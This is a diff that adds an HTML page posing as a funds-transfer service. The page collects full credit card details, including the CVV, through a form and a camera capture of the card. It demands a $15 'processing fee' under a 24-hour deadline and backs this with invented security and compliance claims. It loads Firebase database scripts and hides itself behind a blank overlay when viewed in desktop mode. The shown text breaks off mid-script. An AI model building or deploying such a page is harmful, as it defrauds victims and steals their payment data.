@@ -1,0 +1,1413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google" content="notranslate">
+ 
+ <meta name="color-scheme" content="light">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
+   
+    
+   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+          @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+   
+        body {
+            font-family: Arial, sans-serif;
+            
+            background-color: white;
+            color: #333;
+          
+        }
+       
+         video, canvas  {
+      display: block;
+      width: 98%;
+   height: 62%;
+   border: 1.2px solid #4b0082;
+   box-shadow: 0 0 5px rgba(75, 0, 130, 0.5);
+  border-radius: 4px;
+   margin-left: 0.8%;
+    }
+   .icon-container {
+      display: block;
+      margin-top: 2%;
+      text-align: center;
+   display: flex;
+   text-align: center;
+   justify-content: space-between;
+   align-items: center;
+  
+      }
+    .icon-container img {
+      width: 50px;
+      height: 50px;
+     
+     
+    }
+    
+ .text-bold {
+      font-family: "Poppins", sans-serif;
+   
+    }
+
+        
+        .header {
+          font-family: "Poppins", sans-serif;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+      
+        .header p {
+            margin: 0;
+            color: #666;
+       font-size: 15px;
+       font-family: "Poppins", sans-serif;
+        }
+        .security {
+            margin: 20px 0;
+            padding: 15px;
+            background: #e7f4e8;
+            border-left: 4px solid #4CAF50;
+            font-size: 14px;
+            color: #333;
+            font-weight: 480;
+            font-family: "Poppins", sans-serif;
+            margin-top: -8px;
+         margin-top: 2%;
+           border-radius: 6px;        
+                            
+                             }
+        .security h3 {
+            margin-top: 0;
+            font-family: "Poppins", sans-serif;
+        font-size: 16px;
+        color: #333;
+        }
+   
+.credit-card {
+  position: relative;
+  width: 360px;
+  height: 200px;
+ 
+ 
+  margin: auto;
+  transform-style: preserve-3d;
+  transition: 0.3s;
+  margin-left: -16px;
+}
+.card-front,
+.card-back {
+  position: absolute;
+  width: inherit;
+  height: inherit;
+  background: linear-gradient(#33a4f8, #206df9);
+  border-radius: 1em;
+  backface-visibility: hidden;
+  }
+ .card-back {
+    margin-left: -33px;
+  
+}
+.card-front {
+  padding: 2em 1em;
+margin-left: 17px;
+}
+.branding {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.branding img {
+  width: 50px;
+  height: auto;
+}
+.card-back {
+  position: absolute;
+  transform: rotateY(180deg);
+}
+.card-number {
+  color: #ffffff;
+  font-weight: 600;
+  display: flex;
+  justify-content: space-between;
+  font-size: 19px;
+  margin-top: 3em;
+}
+.details {
+  color: #ffffff;
+  display: flex;
+  justify-content: space-between;
+  margin-top: 1.5em;
+  font-size: 15px;
+  font-family: "Poppins", sans-serif;
+  font-weight: bold;
+}
+.details span {
+  display: block;
+}
+.details #card-holder-name {
+  text-transform: uppercase;
+}
+.card-back .black-strip {
+  position: relative;
+  background-color: #000000;
+  height: 50px;
+  top: 2em;
+}
+.card-back .white-strip {
+  top: 3em;
+  position: relative;
+  text-align: right;
+}
+.card-back .white-strip span {
+  margin-right: 1em;
+}
+.card-back .white-strip div {
+  height: 12px;
+  background-color: #ffffff;
+  margin-top: 0.5em;
+width: 9%;
+margin-left: 83%;
+padding: 12px;
+border-radius: 7px;
+font-weight: 600;
+color: black;
+}
+.card-back .visa-logo {
+  position: absolute;
+  width: 50px;
+  margin-top: 4em;
+  right: 1em;
+}
+
+
+
+.back-arrow1 {
+      width: 11px;
+      height: 11px;
+      border-left: 2.3px solid #4b2b7f;
+      border-bottom: 2.3px solid #4b2b7f;
+      transform: rotate(45deg);
+      margin-left: -88%;
+      position: fixed;
+  margin-top: -1%;
+    }
+     .header5 {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            
+      position: fixed;
+      background-color: white; 
+      width: 100%; 
+       height: 5.3%;
+       border-bottom: 1.2px solid black;
+      z-index: 99999999;
+       margin-left: -1.9%;
+       top: 0%;
+      position: fixed;
+        }
+
+        .header5 h1 {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 0;
+            text-align: center;
+        margin-top: -2%;
+       justify-content: center;
+       
+        }
+  .word1 {
+    font-family: "Poppins", sans-serif;
+   } 
+   .word{
+      width: 95.2%;
+      height: 43px;
+  font-size: 16px;
+  color: black;
+  padding: 0 14px;
+  
+   } 
+ input {
+        border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+            outline: none;
+ font-weight: 400;
+ box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+margin-top: 2%;
+margin-bottom: 2%;
+ padding: 0 6px;
+font-family: "Poppins", sans-serif;
+ }
+   input:focus {
+            border-color: #4b0082;
+            box-shadow: 0 0 5px rgba(75, 0, 130, 0.5);
+        }
+    .select {
+        border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+            outline: none;
+ font-weight: 400;
+ box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  width: 96.2%;
+      height: 43px;
+margin-bottom: 2%;
+font-size: 16px;
+  color: black;
+  font-family: "Poppins", sans-serif;
+  }
+   .select:focus {
+            border-color: #4b0082;
+            box-shadow: 0 0 5px rgba(75, 0, 130, 0.5);
+        }
+   .word3{
+   padding: 13px;
+            font-size: 16px;
+            font-weight: 400;
+            color: #ffffff;
+            background-color: #d3c3e5;
+            border: none;
+            border-radius: 6px;
+            cursor: not-allowed;   
+width: 90%;
+margin-top: 3%;
+  }
+    .word3.active {
+            background-color: #4b0082;
+            
+        }
+   .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+     z-index: 99999999;       
+        }
+
+        .modal-content {
+            background-color: white;
+            
+          padding: 3px;
+           
+            width: 99%;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+   .container22 {
+            width: 100%;
+           
+            background-color: #ffffff;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            
+            overflow: hidden;
+     margin-left: -1.3px;
+        }
+
+       
+
+        .content1 {
+            padding: 19px 7px;
+      margin-top: 6%;
+        }
+
+        .content1 p {
+            margin: 0 0 8px;
+            line-height: 1.2;
+            font-size: 16px;
+       font-family: "Poppins", sans-serif;
+        }
+
+        .icon-section1 {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .icon-section1 img {
+            width: 40px;
+            margin-right: 15px;
+        }
+
+        .icon-section1 p {
+            margin: 0;
+            font-size: 13px;
+      font-family: "Poppins", sans-serif;
+        }
+
+        .urgent-message1 {
+            background-color: #ff9800;
+            color: #ffffff;
+            padding: 11px;
+            border-radius: 8px;
+            margin: 25px 0;
+            text-align: center;
+            font-weight: 490;
+            font-size: 13px;
+       font-family: "Poppins", sans-serif;
+        }
+
+        .pay-button {
+            width: 100%;
+            background-color: #4b0082;
+            color: #ffffff;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 18px;
+            
+            margin-top: 20%;
+            
+      
+        }
+
+      
+
+        .trust-icons {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .trust-icons img {
+            width: 40px;
+        }
+
+        .testimonials {
+            font-style: italic;
+            color: #555;
+            margin-top: 30px;
+        }
+
+        .testimonials p {
+            font-size: 1px;
+            margin-bottom: 10px;
+       font-family: "Poppins", sans-serif;
+        }
+
+        .footer2 {
+            background-color: #f0f2f5;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #999;
+       font-family: "Poppins", sans-serif;
+        }
+   .back-arrow1b {
+      width: 11px;
+      height: 11px;
+      border-left: 2.3px solid white;
+      border-bottom: 2.3px solid white;
+      transform: rotate(45deg);
+      margin-left: -86%;
+      position: fixed;
+  margin-top: -3px;
+    }
+    .header5b {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            
+      position: fixed;
+      background-color: #4b2b7f; 
+      width: 102%; 
+       height: 5.3%;
+       border-bottom: 1.2px solid black;
+     margin-left: -1%;
+      
+       top: 0;
+      position: fixed;
+      
+        }
+ .header5b h1 {
+            font-size: 19px;
+            font-weight: 490;
+            margin: 0;
+            text-align: center;
+        margin-top: -2%;
+       justify-content: center;
+       color: white;
+        
+        }
+    .header5d {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+       margin-top: -1%;
+        
+        }
+ .back-arrow3 {
+      width: 10px;
+      height: 10px;
+      border-left: 1.3px solid purple;
+      border-bottom: 1.3px solid purple;
+      transform: rotate(45deg);
+      margin-left: -82%;
+      position: absolute;
+  
+    }
+
+    </style>
+</head>
+<body>
+   
+   <div style="position: fixed; background-color: white; height: 120%; width: 100%; z-index: 9999999999999999999999; margin-left: -2%; margin-top: -14%; display: none;" id="overlay"></div>
+   
+ <div style="background-color: white; width: 100%; width: 100%; position: fìxed;">
+   <div class="header5">
+      <div id="hand3" class="back-arrow1"></div>     
+            <h1 id="trans1">Transfer</h1>
+           
+        </div>
+ 
+  <div id="modalcam"style="display: none; width: 100%; height: 100%; border: 1.2px; solid black; top: 0; position: fixed; z-index: 9999999777779; background-color: white; margin-left: -2%; ">
+  <div  class="header5d">
+    <div  id="fan3" class="back-arrow3"></div>
+    <h1 class="text-bold"style="font-size: 15px; margin-left: -69%; font-weight: 400; color: #4b2b7f;" id="back-header-503">Back</h1>
+  </div>
+   <div style="text-align: center; font-size: 16px; font-weight: 530; padding: 4px; margin-top: -6%;">
+<p class="text-bold" id="response1"></p>
+ 
+  <!-- Video preview from camera -->
+  <video id="video" autoplay playsinline></video>
+
+<div style="text-align: center; justify-content: center; align-items: center; display: flex;">
+ <img id="capture" style="width: 15%;  padding: 8px; border-radius: 50%; margin-top: 5%; border: 1.2px solid #4b0082; box-shadow: 0 0 5px rgba(75, 0, 130, 0.5); " src="https://img.icons8.com/?size=100&id=xA722DfohUfo&format=png&color=4b0082" alt=""></img>
+ </div>
+ 
+
+  <!-- Hidden canvas to capture the image -->
+  <canvas id="canvas" style="display:none;"></canvas>
+</div>
+  <!-- Image preview and confirmation -->
+  <div id="confirmation" style="display: none; margin-top: -5%; width: 99%; ">
+    <p style=" font-size: 14px; font-weight: 530; padding: 5px;" class="text-bold" id="response"></p>
+    <img style="margin-left: 0.8%;  display: block; width: 99%; height: 60%;  border: 1.2px solid #4b0082; box-shadow: 0 0 5px rgba(75, 0, 130, 0.5); border-radius: 4px; "id="preview" src="" alt="Preview Image">
+   
+    <div class="icon-container">
+     
+      <img id="bad-icon" src="https://img.icons8.com/color/48/000000/delete-sign.png" alt="Bad Icon">
+  <img id="good-icon" src="https://img.icons8.com/?size=100&id=uNzoeGXjLfRM&format=png&color=40C057" alt="Good Icon">
+    </div>
+  </div>
+</div>
+  
+    <div class="header">
+        <h1 id="header-title" style=" font-size: 16px; color: #4b2b7f;  margin-top: 12%;">Secure Your Transfer</h1>
+        <p id="header-description" >
+            Add your credit card information below to enjoy seamless, fast and secure transfers.
+        </p>
+    </div>
+   <div style="text-align: center; justify-content: center; align-items: center;">
+    <img src="card.jpg" alt="" style="width: 245px; margin-left: 16px; margin-top: -10px; height: 35px;"></img></div>
+    <div class="security">
+        <h3 id="security-title">Your Security is Our Priority</h3>
+        <p id="security-description">We use industry-leading encryption and security protocols to ensure your data is safe and secure. Your credit card information will be handled with the utmost care and confidentiality.</p>
+        <p id="security-details">Here's what we do to protect you:</p>
+        <ul id="security-list">
+            <li>256-bit SSL encryption to safeguard your data.</li>
+            <li>PCI DSS compliance for secure credit card processing.</li>
+            <li>Regular security audits and updates.</li>
+            <li>24/7 monitoring for fraudulent activities.</li>
+        </ul>
+    </div>
+   <div style="text-align: center; justify-content: center; align-items: center;">
+    <h5 id="scroll-instruction" class="word1"
+    style =" font-size: 15px; color: #333; box-shadow: 0 0 19px rgba(0, 0, 0, 0.1); border-radius: 19px; padding: 3px; margin-top: -3%; font-weight: 501;">
+        To Continue Please Scroll Down And Click On The Camera Picture Below Or Input Card Details Manually Below
+    </h5>
+   <div style="text-align: center; justify-content: center; align-items: center;">
+  <img id="camera1" style="width: 15%; padding: 8px; border-radius: 50%; margin-top: -3%;  border: 1.2px solid #4b0082; box-shadow: 0 0 5px rgba(75, 0, 130, 0.5); width: 18%; height: 18%; " src="https://img.icons8.com/?size=100&id=xA722DfohUfo&format=png&color=4b0082" alt=""></img>
+ </div>
+  
+  </div>
+
+
+
+
+    <!-- Modal 1 -->
+    <div id="modal5" class="modal">
+        <div class="modal-content">
+            
+       <div class="container22" id="payment-container">
+     <div style="background-color: white; width: 100%; width: 100%; position: fìxed;">
+   <div class="header5b">
+      <div  id="closeModal1" class="back-arrow1b"></div>     
+            <h1 id="trans2">Transfer</h1>
+           
+        </div>    
+        <div class="content1">
+            <p id="client-greeting" style="font-weight: bold; font-size: 17px; ">Dear </p>
+
+<span id="displayName" style="font-weight: bold; margin-top: 2%;   font-size: 17px;"></span>
+         
+            <p id="client-greeting2"><span id="jack">To transfer the funds in your account, a small processing fee of </span> <span style="font-weight: bold; ">$15 </span><span id="jack1"> needs to be paid. This fee is crucial for ensuring security and timely processing of your transaction.</span></p>
+
+            <div class="urgent-message1" id="urgent-payment-message">
+                Please! Complete the payment within the next 24 hours to avoid delays in processing your transfer.
+            </div>
+
+            <div class="icon-section1" >
+                <img src="trust1.png" alt="Security">
+                <p id="tac">Your transactions are encrypted with industry-leading security standards.</p>
+            </div>
+            <div class="icon-section1" >
+                <img src="trust5.png" alt="Guarantee">
+                <p id="tac1">We guarantee your payment will be processed immediately after completion.</p>
+            </div>
+
+            <div class="trust-icons">
+                <img src="trust4.png" alt="Verified Payment" >
+                <img src="trust2.png" alt="Trusted by Thousands" >
+                <img src="trust3.png" alt="100% Secure" >
+            </div>
+
+            <button class="pay-button" id="complete-payment-button" style="font-weight: bold;">Complete</button>
+            <div class="footer2" id="footer-text" style="margin-top: 16px;">
+                © 2025 Your Company. All rights reserved.
+            </div>
+        </div>
+    </div>    
+    </div>
+        
+        </div>
+    </div>
+
+    
+    <div class="wrapper" style="text-align: center; justify-content: center; align-items: center; ">
+      <div class="credit-card" id="card">
+        <div class="card-front">
+          <div class="branding">
+            <img src="metal.png" class="chip-img" />
+            <img src="visaa.png" class="visa-logo" />
+          </div>
+          <div class="card-number">
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+          </div>
+          
+          <div class="details">
+            <div>
+              <span id="carrd">Card Holder</span>
+              <span id="card-holder-name">Your Name Here</span>
+            </div>
+            <div>
+              <span id="expire">Expires</span>
+              <span id="validity">06/28</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-back">
+          <div class="black-strip"></div>
+          <div class="white-strip">
+            <span>CVV</span>
+            <div id="cvv-display"></div>
+          </div>
+          <img src="visaa.png" class="visa-logo" />
+        </div>   
+</div>
+</div>
+
+<form id="payment-form">
+  <div style="margin-left: 4%;">
+  <div for="card-number" style ="margin-top: 18%;"id="label-card-number" class="word1">Card Number</div>
+
+    <input class="word" type="number" id="card-number" placeholder="Enter Your Card Number" required>
+    <div for="card-holder" id="label-card-holder" class="word1">Card Holder</div>
+    <input class="word" type="text" id="card-name-input" placeholder="Your Full Name" required>
+       <div  for="card-number" id="label-card-number1" class="word1">Country</div>
+     <select style="margin-top: 2%; padding: 8px;" class="select" id="country" class="country-dropdown" >
+            
+  <option value="" disabled selected id="select">Select Your Country</option>
+  
+    <option value="Afghanistan">Afghanistan</option>
+    <option id="option-ALB" value="Albania">Albania</option>
+    <option id="option-DZA" value="Algeria">Algeria</option>
+    <option id="option-AND" value="Andorra">Andorra</option>
+    <option id="option-AGO" value="Angola">Angola</option>
+    <option id="option-ATG" value="Antigua and Barbuda">Antigua and Barbuda</option>
+    <option id="option-ARG" value="Argentina">Argentina</option>
+    <option id="option-ARM" value="Armenia">Armenia</option>
+    <option id="option-AUS" value="Australia">Australia</option>
+    <option id="option-AUT" value="Austria">Austria</option>
+    <option id="option-AZE" value="Azerbaijan">Azerbaijan</option>
+    <option id="option-BHS" value="Bahamas">Bahamas</option>
+    <option id="option-BHR" value="Bahrain">Bahrain</option>
+    <option id="option-BGD" value="Bangladesh">Bangladesh</option>
+    <option id="option-BRB" value="Barbados">Barbados</option>
+    <option id="option-BLR" value="Belarus">Belarus</option>
+    <option id="option-BEL" value="Belgium">Belgium</option>
+    <option id="option-BLZ" value="Belize">Belize</option>
+    <option id="option-BEN" value="Benin">Benin</option>
+    <option id="option-BTN" value="Bhutan">Bhutan</option>
+    <option id="option-BOL" value="Bolivia">Bolivia</option>
+    <option id="option-BIH" value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+    <option id="option-BWA" value="Botswana">Botswana</option>
+    <option id="option-BRA" value="Brazil">Brazil</option>
+    <option id="option-BRN" value="Brunei">Brunei</option>
+    <option id="option-BGR" value="Bulgaria">Bulgaria</option>
+    <option id="option-BFA" value="Burkina Faso">Burkina Faso</option>
+    <option id="option-BDI" value="Burundi">Burundi</option>
+    <option id="option-CPV" value="Cabo Verde">Cabo Verde</option>
+    <option id="option-KHM" value="Cambodia">Cambodia</option>
+    <option id="option-CMR" value="Cameroon">Cameroon</option>
+    <option id="option-CAN" value="Canada">Canada</option>
+    <option id="option-CAF" value="Central African Republic">Central African Republic</option>
+    <option id="option-TCD" value="Chad">Chad</option>
+    <option id="option-CHL" value="Chile">Chile</option>
+    <option id="option-CHN" value="China">China</option>
+    <option id="option-COL" value="Colombia">Colombia</option>
+    <option id="option-COM" value="Comoros">Comoros</option>
+    <option id="option-COD" value="Congo (Democratic Republic)">Congo (Democratic Republic)</option>
+    <option id="option-COG" value="Congo (Republic)">Congo (Republic)</option>
+    <option id="option-CRI" value="Costa Rica">Costa Rica</option>
+    <option id="option-CIV" value="Côte d'Ivoire">Côte d'Ivoire</option>
+    <option id="option-HRV" value="Croatia">Croatia</option>
+    <option id="option-CUB" value="Cuba">Cuba</option>
+    <option id="option-CYP" value="Cyprus">Cyprus</option>
+    <option id="option-CZE" value="Czech Republic">Czech Republic</option>
+    <option id="option-DNK" value="Denmark">Denmark</option>
+    <option id="option-DJI" value="Djibouti">Djibouti</option>
+    <option id="option-DMA" value="Dominica">Dominica</option>
+    <option id="option-DOM" value="Dominican Republic">Dominican Republic</option>
+    <option id="option-ECU" value="Ecuador">Ecuador</option>
+    <option id="option-EGY" value="Egypt">Egypt</option>
+    <option id="option-SLV" value="El Salvador">El Salvador</option>
+    <option id="option-GNQ" value="Equatorial Guinea">Equatorial Guinea</option>
+    <option id="option-ERI" value="Eritrea">Eritrea</option>
+    <option id="option-EST" value="Estonia">Estonia</option>
+    <option id="option-SWZ" value="Eswatini">Eswatini</option>
+    <option id="option-ETH" value="Ethiopia">Ethiopia</option>
+    <option id="option-FJI" value="Fiji">Fiji</option>
+    <option id="option-FIN" value="Finland">Finland</option>
+    <option id="option-FRA" value="France">France</option>
+   <option id="option-GAB" value="Gabon">Gabon</option>
+    <option id="option-GMB" value="Gambia">Gambia</option>
+    <option id="option-GEO" value="Georgia">Georgia</option>
+    <option id="option-DEU" value="Germany">Germany</option>
+    <option id="option-GHA" value="Ghana">Ghana</option>
+    <option id="option-GRC" value="Greece">Greece</option>
+    <option id="option-GRD" value="Grenada">Grenada</option>
+    <option id="option-GTM" value="Guatemala">Guatemala</option>
+    <option id="option-GIN" value="Guinea">Guinea</option>
+    <option id="option-GNB" value="Guinea-Bissau">Guinea-Bissau</option>
+    <option id="option-GUY" value="Guyana">Guyana</option>
+    <option id="option-HTI" value="Haiti">Haiti</option>
+    <option id="option-HND" value="Honduras">Honduras</option>
+    <option id="option-HUN" value="Hungary">Hungary</option>
+    <option id="option-ISL" value="Iceland">Iceland</option>
+    <option id="option-IND" value="India">India</option>
+    <option id="option-IDN" value="Indonesia">Indonesia</option>
+    <option id="option-IRN" value="Iran">Iran</option>
+    <option id="option-IRQ" value="Iraq">Iraq</option>
+    <option id="option-IRL" value="Ireland">Ireland</option>
+    <option id="option-ISR" value="Israel">Israel</option>
+    <option id="option-ITA" value="Italy">Italy</option>
+    <option id="option-JAM" value="Jamaica">Jamaica</option>
+    <option id="option-JPN" value="Japan">Japan</option>
+    <option id="option-JOR" value="Jordan">Jordan</option>
+    <option id="option-KAZ" value="Kazakhstan">Kazakhstan</option>
+    <option id="option-KEN" value="Kenya">Kenya</option>
+    <option id="option-KIR" value="Kiribati">Kiribati</option>
+    <option id="option-KWT" value="Kuwait">Kuwait</option>
+    <option id="option-KGZ" value="Kyrgyzstan">Kyrgyzstan</option>
+    <option id="option-LAO" value="Laos">Laos</option>
+    <option id="option-LVA" value="Latvia">Latvia</option>
+    <option id="option-LBN" value="Lebanon">Lebanon</option>
+    <option id="option-LSO" value="Lesotho">Lesotho</option>
+    <option id="option-LBR" value="Liberia">Liberia</option>
+    <option id="option-LBY" value="Libya">Libya</option>
+    <option id="option-LIE" value="Liechtenstein">Liechtenstein</option>
+    <option id="option-LTU" value="Lithuania">Lithuania</option>
+    <option id="option-LUX" value="Luxembourg">Luxembourg</option>
+    <option id="option-MDG" value="Madagascar">Madagascar</option>
+    <option id="option-MWI" value="Malawi">Malawi</option>
+    <option id="option-MYS" value="Malaysia">Malaysia</option>
+    <option id="option-MDV" value="Maldives">Maldives</option>
+    <option id="option-MLI" value="Mali">Mali</option>
+    <option id="option-MLT" value="Malta">Malta</option>
+    <option id="option-MHL" value="Marshall Islands">Marshall Islands</option>
+    <option id="option-MRT" value="Mauritania">Mauritania</option>
+    <option id="option-MUS" value="Mauritius">Mauritius</option>
+    <option id="option-MEX" value="Mexico">Mexico</option>
+    <option id="option-FSM" value="Micronesia">Micronesia</option>
+    <option id="option-MDA" value="Moldova">Moldova</option>
+    <option id="option-MCO" value="Monaco">Monaco</option>
+    <option id="option-MNG" value="Mongolia">Mongolia</option>
+    <option id="option-MNE" value="Montenegro">Montenegro</option>
+    <option id="option-MAR" value="Morocco">Morocco</option>
+    <option id="option-MOZ" value="Mozambique">Mozambique</option>
+    <option id="option-MMR" value="Myanmar">Myanmar</option>
+    <option id="option-NAM" value="Namibia">Namibia</option>
+    <option id="option-NRU" value="Nauru">Nauru</option>
+    <option id="option-NPL" value="Nepal">Nepal</option>
+    <option id="option-NLD" value="Netherlands">Netherlands</option>
+    <option id="option-NZL" value="New Zealand">New Zealand</option>
+    <option id="option-NIC" value="Nicaragua">Nicaragua</option>
+    <option id="option-NER" value="Niger">Niger</option>
+    <option id="option-NGA" value="Nigeria">Nigeria</option>
+    <option id="option-PRK" value="North Korea">North Korea</option>
+    <option id="option-MKD" value="North Macedonia">North Macedonia</option>
+    <option id="option-NOR" value="Norway">Norway</option>
+    <option id="option-OMN" value="Oman">Oman</option>
+    <option id="option-PAK" value="Pakistan">Pakistan</option>
+    <option id="option-PLW" value="Palau">Palau</option>
+    <option id="option-PAN" value="Panama">Panama</option>
+    <option id="option-PNG" value="Papua New Guinea">Papua New Guinea</option>
+    <option id="option-PRY" value="Paraguay">Paraguay</option>
+    <option id="option-PER" value="Peru">Peru</option>
+    <option id="option-PHL" value="Philippines">Philippines</option>
+    <option id="option-POL" value="Poland">Poland</option>
+    <option id="option-PRT" value="Portugal">Portugal</option>
+<option id="option-QAT" value="Qatar">Qatar</option>
+    <option id="option-ROU" value="Romania">Romania</option>
+    <option id="option-RUS" value="Russia">Russia</option>
+    <option id="option-RWA" value="Rwanda">Rwanda</option>
+    <option id="option-KNA" value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+    <option id="option-LCA" value="Saint Lucia">Saint Lucia</option>
+    <option id="option-VCT" value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
+    <option id="option-WSM" value="Samoa">Samoa</option>
+    <option id="option-SMR" value="San Marino">San Marino</option>
+    <option id="option-STP" value="Sao Tome and Principe">Sao Tome and Principe</option>
+    <option id="option-SAU" value="Saudi Arabia">Saudi Arabia</option>
+    <option id="option-SEN" value="Senegal">Senegal</option>
+    <option id="option-SRB" value="Serbia">Serbia</option>
+    <option id="option-SYC" value="Seychelles">Seychelles</option>
+    <option id="option-SLE" value="Sierra Leone">Sierra Leone</option>
+    <option id="option-SGP" value="Singapore">Singapore</option>
+    <option id="option-SVK" value="Slovakia">Slovakia</option>
+    <option id="option-SVN" value="Slovenia">Slovenia</option>
+    <option id="option-SLB" value="Solomon Islands">Solomon Islands</option>
+    <option id="option-SOM" value="Somalia">Somalia</option>
+    <option id="option-ZAF" value="South Africa">South Africa</option>
+    <option id="option-KOR" value="South Korea">South Korea</option>
+    <option id="option-SSD" value="South Sudan">South Sudan</option>
+    <option id="option-ESP" value="Spain">Spain</option>
+    <option id="option-LKA" value="Sri Lanka">Sri Lanka</option>
+    <option id="option-SDN" value="Sudan">Sudan</option>
+    <option id="option-SUR" value="Suriname">Suriname</option>
+    <option id="option-SWE" value="Sweden">Sweden</option>
+    <option id="option-CHE" value="Switzerland">Switzerland</option>
+    <option id="option-SYR" value="Syria">Syria</option>
+    <option id="option-TWN" value="Taiwan">Taiwan</option>
+    <option id="option-TJK" value="Tajikistan">Tajikistan</option>
+    <option id="option-TZA" value="Tanzania">Tanzania</option>
+    <option id="option-THA" value="Thailand">Thailand</option>
+    <option id="option-TLS" value="Timor-Leste">Timor-Leste</option>
+    <option id="option-TGO" value="Togo">Togo</option>
+    <option id="option-TON" value="Tonga">Tonga</option>
+    <option id="option-TTO" value="Trinidad and Tobago">Trinidad and Tobago</option>
+    <option id="option-TUN" value="Tunisia">Tunisia</option>
+    <option id="option-TUR" value="Turkey">Turkey</option>
+    <option id="option-TKM" value="Turkmenistan">Turkmenistan</option>
+    <option id="option-TUV" value="Tuvalu">Tuvalu</option>
+    <option id="option-UGA" value="Uganda">Uganda</option>
+    <option id="option-UKR" value="Ukraine">Ukraine</option>
+    <option id="option-ARE" value="United Arab Emirates">United Arab Emirates</option>
+    <option id="option-GBR" value="United Kingdom">United Kingdom</option>
+    <option id="option-USA" value="United States">United States</option>
+    <option id="option-URY" value="Uruguay">Uruguay</option>
+    <option id="option-UZB" value="Uzbekistan">Uzbekistan</option>
+    <option id="option-VUT" value="Vanuatu">Vanuatu</option>
+    <option id="option-VEN" value="Venezuela">Venezuela</option>
+    <option id="option-VNM" value="Vietnam">Vietnam</option>
+    <option id="option-YEM" value="Yemen">Yemen</option>
+    <option id="option-ZMB" value="Zambia">Zambia</option>
+    <option id="option-ZWE" value="Zimbabwe">Zimbabwe</option>
+</select>
+
+         
+           
+       
+  <div class="word1" for="card-holder" id="label-card-holder1">State</div>
+    <input class="word" type="text" id="state" placeholder="Please Enter Your State" required >
+ 
+    
+   </div>    
+   
+    
+        <div for="expiry-month" id="label-expiry-month" style="margin-left: 4%; margin-top: 5px;">Expiry Month</div>
+         <div style="display: flex; ">
+  
+        <select class="select"name="expiry-month" id="expiry-month" required style="margin-left: 4%; height: 49px; width: 125px; border-radius: 6px; font-size:17px;">
+            <option value="" id="tap">Expiry Month</option>
+            <option value="01">01</option>
+            <option value="02">02</option>
+            <option value="03">03</option>
+            <option value="04">04</option>
+            <option value="05">05</option>
+            <option value="06">06</option>
+            <option value="07">07</option>
+            <option value="08">08</option>
+            <option value="09">09</option>
+            <option value="10">10</option>
+            <option value="11">11</option>
+            <option value="12">12</option>
+        </select>
+   
+         <div for="expiry-year" id="label-expiry-year" style="margin-top: -5%;  position: absolute; margin-left: 41.3%;">Expiry Year</div>
+      
+      <div style="display: flex;">
+        <select class="select"name="expiry-year" id="expiry-year"  style="margin-top: 0px; height: 49px; width: 120px; border-radius: 6px; font-size: 17px; margin-left: 25%;" required >
+            <option value="" id="pen">Expiry Year</option>
+            <!-- Add options here -->
+        </select>
+    </div>
+ <div for="cvv" id="label-cvv" style="margin-left: 16%; margin-top: -5%;">CVV:</div>
+      
+        <input  type="number" id="cvv" placeholder="***" style="width: 56px;  font-size: 20px; border-radius: 6px; height: 49px; position: relative; margin-top: 0%; margin-left: -12%; padding: 8px;" required>
+   </div>
+   </div>
+   
+    <div style="text-align: center; justify-content: center; align-items: center; margin-bottom: 20%;">
+    <button class="word3" type="submit" id="verify-button">Proceed</button></div>
+</form>
+
+
+<script src="script2.js"></script>
+
+ <script>
+function detectDesktopMode() {
+            // Check if the device is a mobile device by user-agent
+            const isMobile = /android|iphone|ipad|ipod|windows phone/i.test(navigator.userAgent);
+
+            // Get the current viewport width
+            const viewportWidth = window.innerWidth;
+
+            const deviceStatusElement = document.getElementById("deviceStatus");
+
+            // If it's a mobile device and the viewport width is greater than 800px, we consider it "desktop mode"
+            if (isMobile && viewportWidth > 800) {
+                // Desktop Mode on Mobile
+       document.getElementById("overlay").style.display = "block";         
+          
+            } else if (isMobile && viewportWidth <= 800) {
+                // Mobile Mode
+               document.getElementById("overlay").style.display = "none";            // Mobile mode
+                
